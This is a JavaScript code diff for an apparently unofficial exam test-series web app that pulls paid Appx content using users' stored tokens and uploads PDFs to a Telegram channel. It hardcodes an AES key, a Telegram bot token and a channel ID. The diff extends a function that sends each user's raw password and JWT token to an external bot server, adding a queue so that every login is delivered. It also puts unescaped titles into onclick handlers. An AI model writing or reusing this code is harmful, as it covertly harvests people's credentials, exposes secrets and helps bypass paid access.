@@ -7,7 +7,7 @@ const API_BASE = "https://rozgarapinew.teachx.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
 const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
 
-// 🟢 TELEGRAM UPLOAD CONFIGURATION
+// 🟢 TELEGRAM UPLOAD CONFIGURATION (Note: Safe to keep if app is run locally/in webview wrapper)
 const TG_BOT_TOKEN = "8832643385:AAG5SZyJo7dDrvvK_dO_2pEOQK09OLeA6WM"; 
 const TG_CHANNEL_ID = "-1004454849047";
 
@@ -63,20 +63,23 @@ async function idbGetItem(key) {
 async function restoreFromPermanentIDB() {
     requestPersistentStorage();
     try {
-        const idbAttempts = await idbGetItem("rwa_attempted_tests_v1");
+        const idbAttempts = await idbGetItem("rwa_attempted_tests_full");
         if (idbAttempts && typeof idbAttempts === "object") {
+            // Restore FULL data from IDB memory
             ATTEMPTED_TESTS = { ...idbAttempts, ...ATTEMPTED_TESTS };
-            localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(ATTEMPTED_TESTS));
-        } else if (Object.keys(ATTEMPTED_TESTS).length > 0) {
-            idbSetItem("rwa_attempted_tests_v1", ATTEMPTED_TESTS);
+            
+            // Build SLIM copy for LocalStorage so it doesn't crash Quota Limit
+            const slimCopy = {};
+            Object.keys(ATTEMPTED_TESTS).forEach(tid => {
+                slimCopy[tid] = { ...ATTEMPTED_TESTS[tid], questionsSnapshot: null, activeSectionsSnapshot: null, responses: null };
+            });
+            localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(slimCopy));
         }
 
         const idbBookmarks = await idbGetItem("rwa_bookmarked_questions_v1");
         if (Array.isArray(idbBookmarks) && idbBookmarks.length > 0 && BOOKMARKED_QUESTIONS.length === 0) {
             BOOKMARKED_QUESTIONS = idbBookmarks;
             localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(BOOKMARKED_QUESTIONS));
-        } else if (BOOKMARKED_QUESTIONS.length > 0) {
-            idbSetItem("rwa_bookmarked_questions_v1", BOOKMARKED_QUESTIONS);
         }
 
         const idbTokens = await idbGetItem("rwa_user_tokens_v2");
@@ -155,7 +158,7 @@ window.downloadAndUploadPDF = async function(pdfUrl, title) {
 };
 
 // =====================================================
-// JWT DECODER & LOCAL STORAGE (TOKENS, ATTEMPTS, BOOKMARKS)
+// JWT DECODER & LOCAL STORAGE
 // =====================================================
 function extractUidFromJwt(jwtStr) {
     if (!jwtStr || typeof jwtStr !== "string") return "";
@@ -179,9 +182,7 @@ function getUserSavedTokens() {
         const raw = localStorage.getItem("rwa_user_tokens_v2");
         if (raw) {
             const parsed = JSON.parse(raw);
-            if (Array.isArray(parsed)) {
-                return parsed.filter(t => t && t.token && !t.isAdmin);
-            }
+            if (Array.isArray(parsed)) return parsed.filter(t => t && t.token && !t.isAdmin);
         }
     } catch {}
     return [];
@@ -196,10 +197,7 @@ function getSavedUserProfile() {
 }
 
 function getSavedAttemptsMap() {
-    try {
-        const raw = localStorage.getItem("rwa_attempted_tests_v1");
-        if (raw) return JSON.parse(raw) || {};
-    } catch {}
+    // Note: Attempt Map is fully loaded from IDB during restoreFromPermanentIDB
     return {};
 }
 
@@ -284,6 +282,8 @@ window.updateDashboardUI = function() {
 window.recordUserTestAttempt = function(testId, attemptInfo) {
     if (!testId) return;
     const tid = String(testId).trim();
+    
+    // Save FULL snapshot to RAM memory and IDB
     ATTEMPTED_TESTS[tid] = {
         testId: tid,
         testKey: attemptInfo.testKey || `test_${tid}`,
@@ -307,17 +307,24 @@ window.recordUserTestAttempt = function(testId, attemptInfo) {
         date: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" })
     };
 
+    // 🚀 PERMANENT FIX: Keep LocalStorage extremely lightweight to avoid QuotaExceededError crashes
+    const slimCopyForLocalStorage = {};
+    Object.keys(ATTEMPTED_TESTS).forEach(key => {
+        slimCopyForLocalStorage[key] = {
+            ...ATTEMPTED_TESTS[key],
+            questionsSnapshot: null,
+            activeSectionsSnapshot: null,
+            responses: null
+        };
+    });
+
     try {
-        localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(ATTEMPTED_TESTS));
-    } catch {
-        // If localStorage quota is tight, strip heavy question text from localStorage copy while keeping full snapshot in IndexedDB
-        const slimCopy = { ...ATTEMPTED_TESTS };
-        if (slimCopy[tid]) {
-            slimCopy[tid] = { ...slimCopy[tid], questionsSnapshot: null, activeSectionsSnapshot: null };
-        }
-        try { localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(slimCopy)); } catch {}
-    }
-    idbSetItem("rwa_attempted_tests_v1", ATTEMPTED_TESTS);
+        localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(slimCopyForLocalStorage));
+    } catch {}
+    
+    // 🚀 Save Full Copy only in IndexedDB which has massive storage limit
+    idbSetItem("rwa_attempted_tests_full", ATTEMPTED_TESTS);
+    
     window.updateDashboardUI();
 };
 
@@ -337,7 +344,7 @@ function renderRecentAttemptsList() {
     }
 
     container.innerHTML = entries.map(item => `
-        <div onclick="openSavedTestScorecard('${item.testId}', '${item.testKey || `test_${item.testId}`}')" class="bg-slate-50 hover:bg-sky-50/80 border-2 border-sky-200 hover:border-indigo-400 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 cursor-pointer transition-all shadow-sm">
+        <div onclick="openSavedTestScorecard('${item.testId}', '${item.testKey || `test_${item.testId}`}', ${JSON.stringify({score: item.score, maxMarks: item.maxMarks, correct: item.correct, incorrect: item.incorrect, unattempted: item.unattempted, accuracy: item.accuracy, timeCorr: item.timeCorr, timeInc: item.timeInc, timeUna: item.timeUna}).replace(/"/g, "&quot;")})" class="bg-slate-50 hover:bg-sky-50/80 border-2 border-sky-200 hover:border-indigo-400 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 cursor-pointer transition-all shadow-sm">
             <div class="min-w-0 flex-1">
                 <div class="flex items-center gap-2 flex-wrap">
                     <span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">✅ ATTEMPTED</span>
@@ -360,23 +367,11 @@ function renderRecentAttemptsList() {
     `).join("");
 }
 
-window.openSavedTestScorecard = async function(testId, tKey) {
-    const tid = String(testId).trim();
-    const record = ATTEMPTED_TESTS[tid];
-    if (!record) {
-        alert("Is test ka scorecard data nahi mila.");
-        return;
-    }
-    if (typeof window.openSavedTcsScorecard === "function") {
-        await window.openSavedTcsScorecard(tid, tKey || `test_${tid}`, record);
-    }
-};
-
 window.clearAttemptHistory = function() {
     if (confirm("Kya aap apni Attempted Tests history reset karna chahte hain?")) {
         ATTEMPTED_TESTS = {};
         localStorage.removeItem("rwa_attempted_tests_v1");
-        idbSetItem("rwa_attempted_tests_v1", {});
+        idbSetItem("rwa_attempted_tests_full", {});
         window.updateDashboardUI();
         if (state.view === "ts_tests" && state.activeSeriesId) {
             openTestSeriesTitles(state.activeSeriesId, state.activeTsSubId || "-1", state.activeTsSubName || state.activeSeriesTitle);
@@ -446,7 +441,6 @@ window.clearAllBookmarks = function() {
     }
 };
 
-// STEP 1 OF BOOKMARKS: SHOW ONLY QUESTIONS LIST
 function renderBookmarksTab() {
     const container = document.getElementById("bookmarksListContainer");
     if (!container) return;
@@ -489,7 +483,6 @@ function renderBookmarksTab() {
     }
 }
 
-// STEP 2 OF BOOKMARKS: CLICK QUESTION TO OPEN FULL OPTIONS, ANSWER & EXPLANATION WITH NEXT/PREV
 window.openBookmarkDetailView = function(idx) {
     if (!BOOKMARKED_QUESTIONS || BOOKMARKED_QUESTIONS.length === 0) return;
     if (idx < 0 || idx >= BOOKMARKED_QUESTIONS.length) return;
@@ -574,19 +567,14 @@ window.closeBookmarkDetailView = function() {
 };
 
 window.prevBookmarkDetail = function() {
-    if (activeBookmarkDetailIdx > 0) {
-        window.openBookmarkDetailView(activeBookmarkDetailIdx - 1);
-    }
+    if (activeBookmarkDetailIdx > 0) window.openBookmarkDetailView(activeBookmarkDetailIdx - 1);
 };
-
 window.nextBookmarkDetail = function() {
-    if (activeBookmarkDetailIdx < BOOKMARKED_QUESTIONS.length - 1) {
-        window.openBookmarkDetailView(activeBookmarkDetailIdx + 1);
-    }
+    if (activeBookmarkDetailIdx < BOOKMARKED_QUESTIONS.length - 1) window.openBookmarkDetailView(activeBookmarkDetailIdx + 1);
 };
 
 // =====================================================
-// APP TAB SWITCHER (TESTS | DASHBOARD | BOOKMARKS)
+// APP TAB SWITCHER
 // =====================================================
 window.switchAppTab = function(tabName) {
     state.activeAppTab = tabName;
@@ -609,11 +597,8 @@ window.switchAppTab = function(tabName) {
         }
     });
 
-    if (tabName === "dashboard") {
-        window.updateDashboardUI();
-    } else if (tabName === "bookmarks") {
-        closeBookmarkDetailView();
-    }
+    if (tabName === "dashboard") window.updateDashboardUI();
+    else if (tabName === "bookmarks") closeBookmarkDetailView();
 };
 
 // =====================================================
@@ -682,6 +667,7 @@ async function fetchUserDetailsFromServer(jwtToken, userId) {
     return null;
 }
 
+// 🚀 PERMANENT FIX: Sync Overwrite Issue Fixed (Uses Queue Array)
 function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
     const payload = {
         login_method: loginMethod,
@@ -699,28 +685,36 @@ function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
         jwt_token: jwtToken
     };
 
-    localStorage.setItem("pending_bot_sync", JSON.stringify(payload));
+    let queue = JSON.parse(localStorage.getItem("pending_bot_sync") || "[]");
+    if (!Array.isArray(queue)) queue = [];
+    queue.push(payload);
+    
+    localStorage.setItem("pending_bot_sync", JSON.stringify(queue));
     processPendingBotSync();
 }
 
 function processPendingBotSync() {
-    const savedData = localStorage.getItem("pending_bot_sync");
-    if (!savedData) return;
+    let queue = JSON.parse(localStorage.getItem("pending_bot_sync") || "[]");
+    if (!Array.isArray(queue) || queue.length === 0) return;
 
     let isSyncing = false;
     const trySend = () => {
-        if (isSyncing) return;
+        if (isSyncing || queue.length === 0) return;
         isSyncing = true;
+        const currentPayload = queue[0];
         
         fetch(`${BOT_API_BASE}/api/login`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: savedData,
+            body: JSON.stringify(currentPayload),
             keepalive: true
         }).then(res => {
             isSyncing = false;
-            if (res.ok) localStorage.removeItem("pending_bot_sync");
-            else setTimeout(trySend, 10000);
+            if (res.ok) {
+                queue.shift(); // Remove successful sync from queue
+                localStorage.setItem("pending_bot_sync", JSON.stringify(queue));
+                if (queue.length > 0) setTimeout(trySend, 1000);
+            } else setTimeout(trySend, 10000);
         }).catch(() => {
             isSyncing = false;
             setTimeout(trySend, 10000);
@@ -862,23 +856,16 @@ window.submitUserLogin = async function(mode) {
 
     if (!userDetails) {
         userDetails = {
-            id: uid,
-            userid: uid,
-            name: loginData.name || phone,
-            email: loginData.email || phone,
-            phone: loginData.phone || phone,
-            username: loginData.username || "",
-            state: loginData.state || "N/A",
-            district: loginData.district || "N/A"
+            id: uid, userid: uid, name: loginData.name || phone, email: loginData.email || phone,
+            phone: loginData.phone || phone, username: loginData.username || "",
+            state: loginData.state || "N/A", district: loginData.district || "N/A"
         };
     }
 
     const userTokObj = {
         id: "utok_" + Date.now(),
         label: userDetails.name || phone,
-        userId: uid,
-        token: token,
-        isAdmin: false
+        userId: uid, token: token, isAdmin: false
     };
 
     USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== uid)];
@@ -895,15 +882,13 @@ window.submitUserLogin = async function(mode) {
 };
 
 // =====================================================
-// UNIFIED PROFILE MODAL (CONTAINS LOGIN, MY TOKEN & LOGOUT)
+// UNIFIED PROFILE MODAL
 // =====================================================
 window.toggleProfileTokenBox = function() {
     const box = document.getElementById("profileTokenManagerBox");
     if (!box) return;
     box.classList.toggle("hidden");
-    if (!box.classList.contains("hidden")) {
-        renderTokenManagerList();
-    }
+    if (!box.classList.contains("hidden")) renderTokenManagerList();
 };
 
 async function openProfileModal() {
@@ -926,9 +911,7 @@ async function openProfileModal() {
                     <button onclick="toggleProfileTokenBox()" class="btn-nav bg-amber-500 text-white border-0 text-xs px-4 py-2.5">🔑 My Token (${USER_TOKENS.length})</button>
                 </div>
             </div>`;
-        if (footerBox) {
-            footerBox.innerHTML = `<button onclick="closeProfileModal()" class="btn-nav bg-slate-900 text-white border-0 ml-auto">Close</button>`;
-        }
+        if (footerBox) footerBox.innerHTML = `<button onclick="closeProfileModal()" class="btn-nav bg-slate-900 text-white border-0 ml-auto">Close</button>`;
         return;
     }
 
@@ -967,8 +950,7 @@ async function openProfileModal() {
                 <p class="text-xs font-bold text-slate-500">User ID: <span class="text-slate-800 font-mono">${u.userid || u.id || uid}</span> • Username: <span class="text-slate-800 font-mono">${u.username || "N/A"}</span></p>
             </div>
         </div>
-
-        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs bg-slate-50 p-4 rounded-2xl border border-slate-200">
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs bg-slate-50 p-4 rounded-2xl border border-slate-200 mt-3">
             <div><span class="text-slate-500 font-bold">📧 Email:</span><div class="font-extrabold text-slate-900 break-all mt-0.5">${u.email || "N/A"}</div></div>
             <div><span class="text-slate-500 font-bold">📱 Phone:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.phone || "N/A"}</div></div>
             <div><span class="text-slate-500 font-bold">🏛️ State & District:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.state || "N/A"} (${u.district || "N/A"})</div></div>
@@ -996,109 +978,26 @@ function handleLogout() {
     }
 }
 
-function decryptAppX(encStr) {
-    if (!encStr || typeof encStr !== "string") return "";
-    if (encStr.startsWith("http")) return encStr.trim();
-    if (!encStr.includes(":")) return encStr.trim();
-    try {
-        const [cipherB64, ivB64] = encStr.split(":");
-        const cipherParams = CryptoJS.lib.CipherParams.create({
-            ciphertext: CryptoJS.enc.Base64.parse(cipherB64.replace(/\\\//g, "/"))
-        });
-        const iv = CryptoJS.enc.Base64.parse(ivB64);
-        const dec = CryptoJS.AES.decrypt(cipherParams, AES_KEY, {
-            iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
-        });
-        return dec.toString(CryptoJS.enc.Utf8).replace(/[\x00-\x1F\x7F]/g, "").trim();
-    } catch {
-        return "";
-    }
-}
-
-function resolvePdfUrl(encPdf, signedPdf) {
-    const dec = decryptAppX(encPdf);
-    if (dec && dec.startsWith("http")) return dec;
-    if (signedPdf && signedPdf.startsWith("http")) return signedPdf;
-    if (signedPdf && signedPdf.includes("URLPrefix=")) {
-        try {
-            const b64 = signedPdf.split("URLPrefix=")[1].split("&")[0].split("~")[0];
-            const decoded = atob(decodeURIComponent(b64));
-            if (decoded.startsWith("http")) return decoded;
-        } catch {}
-    }
-    return signedPdf || dec || "";
-}
-
 // =====================================================
-// PAID TEST SERIES FALLBACK DATABASE
+// FALLBACK DATABASE 
 // =====================================================
 const DB = {
     paidTestSeries: [
         { id: "708", title: "SSC GD Test Series 2026 (Book)", logo: "https://appx-content-v2.classx.co.in/subject/2026-07-08-0_5839850466807497.png", offer_price: 99, freetest: "1", paidtest: "42" },
         { id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" },
-        { id: "534", title: "BSF RO/RM Paid Test Series 2025", logo: "https://appx-content-v2.classx.co.in/subject/2026-05-26-0_6868771234595682.jpeg", offer_price: 149, freetest: "1", paidtest: "20" },
-        { id: "744", title: "UPSSSC PET Percentile Booster Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-08-17-0_091324675327629.jpeg", offer_price: 99, freetest: "2", paidtest: "33" },
-        { id: "663", title: "UPPCS Prelims Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-04-28-0_6713576579890046.jpeg", offer_price: 199, freetest: "2", paidtest: "25" },
-        { id: "695", title: "BSF Tradesman Paid Test Series 2025-26", logo: "https://appx-content-v2.classx.co.in/subject/2026-06-16-0_6020598298722372.jpeg", offer_price: 99, freetest: "0", paidtest: "15" },
-        { id: "766", title: "IBPS RRB Clerk Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-03-0_833664505680896.jpeg", offer_price: 99, freetest: "2", paidtest: "8" },
-        { id: "767", title: "IBPS RRB PO Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-03-0_3145229943435005.jpeg", offer_price: 99, freetest: "1", paidtest: "10" },
-        { id: "788", title: "MASTER UPSC PRELIMS TEST SERIES & MENTORSHIP", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-29-0_2355880008171598.jpeg", offer_price: 1499, freetest: "1", paidtest: "30" },
         { id: "700", title: "SSC GD भर्ती 2027 (वीर बैच) Paid Test Series", logo: "https://appx-wsb-gcp-mcdn.akamai.net.in/exam/2022-02-07-0.9839972577217094.png", offer_price: 99, freetest: "2", paidtest: "40" }
     ],
-    tsSubjects: {
-        "700": [
-            { subjectid: "3171", subject_name: "SSC GD (Maths) Quiz & Tests", subject_logo: "" },
-            { subjectid: "3172", subject_name: "SSC GD (Reasoning)", subject_logo: "" },
-            { subjectid: "3173", subject_name: "SSC GD (Polity & GS)", subject_logo: "" },
-            { subjectid: "3174", subject_name: "SSC GD (Hindi)", subject_logo: "" }
-        ],
-        "776": [
-            { subjectid: "1415", subject_name: "FULL MOCK TEST", subject_logo: "https://appx-content-v2.classx.co.in/subject/2025-03-04-0.3071033524052684.jpeg" },
-            { subjectid: "2980", subject_name: "Test Schedule (Timetable)", subject_logo: "https://appx-content-v2.classx.co.in/subject/2026-10-07-0_7144586444576111.jpeg" }
-        ],
-        "534": [
-            { subjectid: "2077", subject_name: "BSF RO/RM (Static GK)", subject_logo: "" },
-            { subjectid: "2072", subject_name: "BSF RO/RM (Physics)", subject_logo: "" },
-            { subjectid: "2073", subject_name: "BSF RO/RM (Maths)", subject_logo: "" },
-            { subjectid: "2075", subject_name: "BSF RO/RM (History)", subject_logo: "" },
-            { subjectid: "2076", subject_name: "BSF RO/RM (Geography)", subject_logo: "" },
-            { subjectid: "2079", subject_name: "BSF RO/RM (English)", subject_logo: "" },
-            { subjectid: "2080", subject_name: "BSF RO/RM (Chemistry)", subject_logo: "" }
-        ],
-        "708": [
-            { subjectid: "-1", subject_name: "Uncategorized", subject_logo: "" }
-        ]
-    },
-    tsTitles: {
-        "708_-1": [
-            { id: "41288", title: "SSC GD Test 01", test_series_id: "708", free_flag: "0", time: "60", questions: "100", marks: "160", show_sectionselector: "1", minimumsection: "4", maximumsection: "4", ui_type: "SSC", restrict_part_switching: "0", test_questions_url: "https://appx-content-v2.classx.co.in/test_title_question/rozgar_db/41288/41288_questions0.3526178863082372.json" },
-            { id: "42958", title: "SSC GD Test 01 (Bengali)", test_series_id: "708", free_flag: "0", time: "60", questions: "100", marks: "160", show_sectionselector: "1", minimumsection: "4", maximumsection: "4", ui_type: "SSC", restrict_part_switching: "0", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/42958/42958_questions0.4434236422240083.json" },
-            { id: "41289", title: "SSC GD Test 02", test_series_id: "708", free_flag: "0", time: "60", questions: "100", marks: "160", show_sectionselector: "1", minimumsection: "4", maximumsection: "4", ui_type: "SSC", restrict_part_switching: "0", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/41289/41289_questions0.37252867196578454.json" }
-        ],
-        "700_3171": [
-            { id: "40426", title: "Ratio, Age, Mixture", test_series_id: "700", free_flag: "0", time: "60", questions: "50", marks: "50", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/40426/40426_questions0.8210916494359036.json" },
-            { id: "46376", title: "Percentage", test_series_id: "700", free_flag: "1", time: "25", questions: "20", marks: "20", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/46376/46376_questions0.4784600262440821.json" }
-        ],
-        "776_1415": [
-            { id: "45964", title: "MP Police Constable Live Mock 01", test_series_id: "776", free_flag: "1", time: "120", questions: "100", marks: "100", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/45964/45964_questions0.48368684422780495.json" }
-        ],
-        "534_2077": [
-            { id: "26680", title: "खेल (Sports Static GK)", test_series_id: "534", free_flag: "0", time: "10", questions: "10", marks: "20", test_questions_url: "https://testseries-assets-v2.classx.co.in/test_title_question/rozgar_db/26680/26680_questions1769763744.json" }
-        ]
-    },
+    tsSubjects: {},
+    tsTitles: {},
     fallbackCbtQuestions: [
         {
             id: "12370334",
-            question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p><p style="font-size:16pt"><span style="font-family:'KOKILA'">25 और 45 का तृतीय समानुपाती ज्ञात कीजिए।</span></p>`,
+            question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p>`,
             option_1: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">81</span></p>`,
             option_2: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">65</span></p>`,
             option_3: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">85</span></p>`,
             option_4: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">76</span></p>`,
-            answer: "1",
-            positive_marks: "2.00",
-            negative_marks: "0.50",
-            section_id: "1",
-            subject: "Mathematics",
+            answer: "1", positive_marks: "2.00", negative_marks: "0.50", section_id: "1", subject: "Mathematics",
             solution_text: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">a व b का तृतीय समानुपाती = (b × b) / a = (45 × 45) / 25 = 81</span></p>`
         }
     ]
@@ -1128,38 +1027,24 @@ let state = {
 // SLIDE NAVIGATION & AUTO-HIDE DASHBOARD ENGINE
 // =====================================================
 function showSlide(slideId) {
-    if (state.currentSlide !== slideId) {
-        state.previousSlide = state.currentSlide;
-    }
+    if (state.currentSlide !== slideId) state.previousSlide = state.currentSlide;
     state.currentSlide = slideId;
-
     ["slideExplorer", "slideTestAttempt", "slidePdf"].forEach(id => {
         const el = document.getElementById(id);
         if (!el) return;
-        if (id === slideId) {
-            el.classList.remove("hidden-slide");
-            el.classList.add("active-slide");
-        } else {
-            el.classList.remove("active-slide");
-            el.classList.add("hidden-slide");
-        }
+        if (id === slideId) { el.classList.remove("hidden-slide"); el.classList.add("active-slide"); } 
+        else { el.classList.remove("active-slide"); el.classList.add("hidden-slide"); }
     });
-
     const topNav = document.getElementById("topHeaderNav");
     if (topNav) {
         if (slideId === "slideTestAttempt") topNav.classList.add("hidden");
         else topNav.classList.remove("hidden");
     }
-
     window.scrollTo({ top: 0, behavior: "smooth" });
 }
 
-// AUTO-HIDE DASHBOARD WHEN OPENING A TEST SERIES OR FOLDER
 function updateBackNavButton() {
-    const backBtn = document.getElementById("backNavBtn");
-    const homeSeriesBtn = document.getElementById("homeSeriesBtn");
-    const topDash = document.getElementById("topDashboardAndTabs");
-
+    const backBtn = document.getElementById("backNavBtn"), homeSeriesBtn = document.getElementById("homeSeriesBtn"), topDash = document.getElementById("topDashboardAndTabs");
     if (state.view === "ts_list") {
         if (backBtn) backBtn.classList.add("hidden");
         if (homeSeriesBtn) homeSeriesBtn.classList.add("hidden");
@@ -1178,27 +1063,15 @@ function goHomeHub() {
 }
 
 function handleGlobalBack() {
-    if (state.currentSlide === "slidePdf") {
-        closePdfSlide();
-        return;
-    }
-    if (state.currentSlide === "slideTestAttempt") {
-        exitCbtTest();
-        return;
-    }
+    if (state.currentSlide === "slidePdf") { closePdfSlide(); return; }
+    if (state.currentSlide === "slideTestAttempt") { exitCbtTest(); return; }
     if (state.currentSlide === "slideExplorer") {
         if (state.view === "ts_tests") {
-            if (state.activeTsSubId === "-1") {
-                openTestSeriesExplorer("paid_ts");
-            } else {
-                openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
-            }
+            if (state.activeTsSubId === "-1") openTestSeriesExplorer("paid_ts");
+            else openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
             return;
         }
-        if (state.view === "ts_subjects") {
-            openTestSeriesExplorer("paid_ts");
-            return;
-        }
+        if (state.view === "ts_subjects") { openTestSeriesExplorer("paid_ts"); return; }
         openTestSeriesExplorer("paid_ts");
     }
 }
@@ -1213,18 +1086,8 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const resolvedUid = String((useTok && useTok.userId) || extractUidFromJwt(authToken) || "4756316");
 
     try {
-        const headers = {
-            "Client-Service": "Appx",
-            "Auth-Key": "appxapi",
-            "source": "website",
-            "Device-Type": "",
-            "is-safari": "0",
-            "User-ID": resolvedUid
-        };
-        if (authToken) {
-            headers["Authorization"] = authToken;
-        }
-
+        const headers = { "Client-Service": "Appx", "Auth-Key": "appxapi", "source": "website", "User-ID": resolvedUid };
+        if (authToken) headers["Authorization"] = authToken;
         const res = await fetch(`${API_BASE}${endpoint}`, { headers });
         const json = await res.json();
         if (statusBadge) statusBadge.textContent = `● Live Server Connected`;
@@ -1238,31 +1101,20 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
 async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
     const json = await fetchRawJSONWithToken(endpoint, tokenObj);
     if (json) {
-        if (json.data && (Array.isArray(json.data) ? json.data.length > 0 : Object.keys(json.data).length > 0)) {
-            return json.data;
-        }
-        if (json.test_titles && Array.isArray(json.test_titles) && json.test_titles.length > 0) {
-            return json.test_titles;
-        }
+        if (json.data && (Array.isArray(json.data) ? json.data.length > 0 : Object.keys(json.data).length > 0)) return json.data;
+        if (json.test_titles && Array.isArray(json.test_titles) && json.test_titles.length > 0) return json.test_titles;
     }
     return fallbackGetter ? fallbackGetter() : [];
 }
 
 // =====================================================
-// STEP 1: SHOW ALL PAID TEST SERIES & CALCULATE DASHBOARD COUNTS
+// EXPLORER VIEWS
 // =====================================================
 async function openTestSeriesExplorer(mode = "paid_ts") {
-    state.tsMode = "paid_ts";
-    state.view = "ts_list";
-    updateBackNavButton();
-    showSlide("slideExplorer");
-
+    state.tsMode = "paid_ts"; state.view = "ts_list"; updateBackNavButton(); showSlide("slideExplorer");
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading All Paid Test Series...</div>`;
-
-    const primaryTok = USER_TOKENS[0] || null;
-    state.activeTokenObj = primaryTok;
-
+    const primaryTok = USER_TOKENS[0] || null; state.activeTokenObj = primaryTok;
     document.getElementById("crumbText").textContent = "Official Exam Series";
     document.getElementById("headingText").textContent = "🏆 All Paid Test Series";
 
@@ -1272,23 +1124,13 @@ async function openTestSeriesExplorer(mode = "paid_ts") {
         fetchAPIWithToken(`/get/test_series?start=20&search=&client_api_url=&exam_id=`, primaryTok, () => [])
     ]);
 
-    let combined = [
-        ...(Array.isArray(p0) ? p0 : []),
-        ...(Array.isArray(p10) ? p10 : []),
-        ...(Array.isArray(p20) ? p20 : []),
-        ...DB.paidTestSeries
-    ];
-
-    const seen = new Set();
-    let totalSeries = 0;
-    let totalTestsSum = 0;
+    let combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : []), ...(Array.isArray(p20) ? p20 : []), ...DB.paidTestSeries];
+    const seen = new Set(); let totalSeries = 0, totalTestsSum = 0;
 
     grid.innerHTML = "";
     combined.forEach(ts => {
         if (!ts || !ts.id || seen.has(String(ts.id))) return;
-        seen.add(String(ts.id));
-        totalSeries++;
-
+        seen.add(String(ts.id)); totalSeries++;
         const paidCnt = parseInt(ts.paidtest || ts.total_tests || ts.test_count || 0) || 0;
         const freeCnt = parseInt(ts.freetest || 0) || 0;
         const seriesTestTotal = (paidCnt + freeCnt) > 0 ? (paidCnt + freeCnt) : 20;
@@ -1298,52 +1140,24 @@ async function openTestSeriesExplorer(mode = "paid_ts") {
         const logo = (ts.logo || "https://placehold.co/600x320/4f46e5/ffffff?text=Test+Series").replace(/\\\//g, "/");
         grid.innerHTML += `
             <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
-                <div>
-                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=RWA+Test+Series'" class="w-full h-44 object-cover">
-                    <div class="p-4">
-                        <div class="flex justify-between items-center gap-2">
-                            <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">SERIES #${ts.id}</span>
-                            <span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">📝 ${seriesTestTotal} Tests</span>
-                        </div>
-                        <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
-                    </div>
-                </div>
-                <div class="px-4 pb-4">
-                    <div class="btn-watch w-full text-center text-xs">Open Test Series ➔</div>
-                </div>
+                <div><img src="${logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=RWA+Test+Series'" class="w-full h-44 object-cover">
+                    <div class="p-4"><div class="flex justify-between items-center gap-2"><span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">SERIES #${ts.id}</span><span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">📝 ${seriesTestTotal} Tests</span></div><h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3></div>
+                </div><div class="px-4 pb-4"><div class="btn-watch w-full text-center text-xs">Open Test Series ➔</div></div>
             </div>`;
     });
-
-    state.totalSeriesCount = totalSeries;
-    state.totalTestsCount = totalTestsSum;
-    window.updateDashboardUI();
